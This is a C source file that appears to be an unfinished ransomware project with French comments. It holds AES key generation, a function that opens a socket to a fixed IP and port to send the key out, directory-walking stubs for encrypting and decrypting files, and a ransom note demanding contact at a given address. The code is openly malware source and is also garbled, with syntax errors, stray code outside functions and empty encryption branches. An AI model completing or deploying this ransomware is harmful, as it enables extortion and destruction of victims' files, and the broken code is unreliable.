#include "ransomlib.h"
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h> //aloc memory

// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <string.h>
// for isFile()
#include <sys/types.h> //isFile()
#include <errno.h>
//ransomlib.h rewrite
#define SIZEKEY AES_256_KEY_SIZE
#define SIZEIV AES_BLOCK_SIZE

void usage();
int is_encrypted(char *filename);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int isFile(const char* name);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);

void usage(void){
    printf(
            "\nUsage:\n"
            " ./ransom <path> [e|d] <key in hex if decrypt>"
            );
    printf(
            "\nOptions:\n"
            "-e    Encrypt input and store results to output\n"
            "-d    Decrypt input and store results to output\n"
            "-h    Print this message\n"
            );
}

int is_encrypted(char *filename){
    char buffer_filename[strlen(filename)];

    strcpy(buffer_filename, filename);
    char *token = strtok(buffer_filename, ".");

    while(token != NULL){
        if(strcmp(token, "encrypt") == 0){
            return 1;
        }
        token = strtok(NULL, ".");
    }
    return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){

    directeur(*name){
        struct dirent *dir;
        // https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1046380353&id=1044780608
        // Do a recursive function on the files found & exclude. and ..
        DIR *d = opendir(".");
        if (d)
        {
            while ((dir = readdir(d)) != NULL)
            {
                printf("%s\n", dir->d_name);
                if(isFile(dir->d_name)==0)
                {
                    directeur(dir->d_name);
                }
            }
            closedir(d);
        }
    }
}

//Encrypt
    if (de_flag == 0){


    }
//Decrypt
    if (de_flag == 1){


    }

int isFile(const char* name){
    DIR* directory = opendir(name);

    if(directory != NULL)
    {
        closedir(directory);
        return 0;
    }
    if(errno == ENOTDIR)
    {
        return 1;
    }
    return -1;
}



int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
    if(RAND_bytes(key, sizeKey) == 0) {
        test(key,sizeKey);
    }
    if(RAND_bytes(iv, sizeIv) == 0) {
        test(iv, sizeIv);
    }
    bytes_to_hexa(key, pKey, sizeKey);
    bytes_to_hexa(iv, pIv, sizeIv);
}

int send_key(char *pKey, char *pIv)
{
    //Create Socket
    int sockid;
    int server_port = 8888;
    char *server_ip = "192.168.232.128";

    sockid = socket(AF_INET,SOCK_STREAM,0);

    struct sockaddr_in server_addr,
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    //Message
    char *msg = "hello";                                                                    // to do send pKey & pIV

    connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

    send(sockid, (const char *)msg, strlen(msg),0)

    //Delete Message
    memset(msg, 0, sizeof(char));
    memset(pKey, 0, sizeof(char));
    memset(pIv, 0, sizeof(char));

    close(sockid);

}

int main (int argc, char * argv[])
{
    //Binaire
    key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
    iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
    //Hexa
    pKey = (char*)calloc((SIZEKEY*2)+1,sizeof(unsigned char));
    pIv = (char*)calloc((SIZEIV*2)+1,sizeof(unsigned char));


    //Get Arguments
    if (argc > 1) {
        if (!strcmp(argv[1],"-e") {
            if (argc != 3) {
                printf("Do something more like ./ransom -e <path>\n");
                return 0;
            }

            generate_key(key, SIZEKEY, iv, SIZEIV, pKey, pIv);
            send_key(pKey, pIV);
            listdir(argv[2],iv,key,0);                                                                       // to verify
        }
        else if (!strcmp(argv[1],"-d") {
            if (argc != 5) {
                printf("Do something more like ./ransom -d <path> <key> <vector>\n");
                return 0;
            }

            listdir(argv[2],iv,key,1);                                                                       // to verify
        }
        else if (!strcmp(argv[1],"-h") {
            usage();
            return 0
        }
        else {
            printf("Wrong argument");
            return 0
        }
    }
    else {
        printf("Please specify -e or -d to continue\n");
        usage();
        return 0;




        //Ransom Letter - Ne pourra pas être écrit si on encrypt toute la machine -> mettre une condition ne pas encrypt ransom.txt après l'avoir créé
        FILE* fichier = NULL;

        fichier = fopen("ransom.txt", "w");

        if (fichier != NULL)
        {
            fputs("Your Computer has been intercepted and placed under quarantine\nPlease contact us at the following address to have access to your machine unlocked:\n getpowned@yahoo.fr", fichier);
            fclose(fichier);
        }

        return 0;
    }

}


/*  Test Gestion des fichiers volumineux - st_size  #include <sys/stat.h> & #include <time.h>  https://linux.die.net/man/2/stat
int
main(int argc, char *argv[])
{
    struct stat sb;

   if (argc != 2) {
        fprintf(stderr, "Usage: %s <pathname>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

   if (stat(argv[1], &sb) == -1) {
        perror("stat");
        exit(EXIT_FAILURE);
    }

   printf("File type:                ");

   switch (sb.st_mode & S_IFMT) {
    case S_IFBLK:  printf("block device\n");            break;
    case S_IFCHR:  printf("character device\n");        break;
    case S_IFDIR:  printf("directory\n");               break;
    case S_IFIFO:  printf("FIFO/pipe\n");               break;
    case S_IFLNK:  printf("symlink\n");                 break;
    case S_IFREG:  printf("regular file\n");            break;
    case S_IFSOCK: printf("socket\n");                  break;
    default:       printf("unknown?\n");                break;
    }

   printf("I-node number:            %ld\n", (long) sb.st_ino);

   printf("Mode:                     %lo (octal)\n",
            (unsigned long) sb.st_mode);

   printf("Link count:               %ld\n", (long) sb.st_nlink);
    printf("Ownership:                UID=%ld   GID=%ld\n",
            (long) sb.st_uid, (long) sb.st_gid);

   printf("Preferred I/O block size: %ld bytes\n",
            (long) sb.st_blksize);
    printf("File size:                %lld bytes\n",
            (long long) sb.st_size);
    printf("Blocks allocated:         %lld\n",
            (long long) sb.st_blocks);

   printf("Last status change:       %s", ctime(&sb.st_ctime));
    printf("Last file access:         %s", ctime(&sb.st_atime));
    printf("Last file modification:   %s", ctime(&sb.st_mtime));

   exit(EXIT_SUCCESS);
}

 */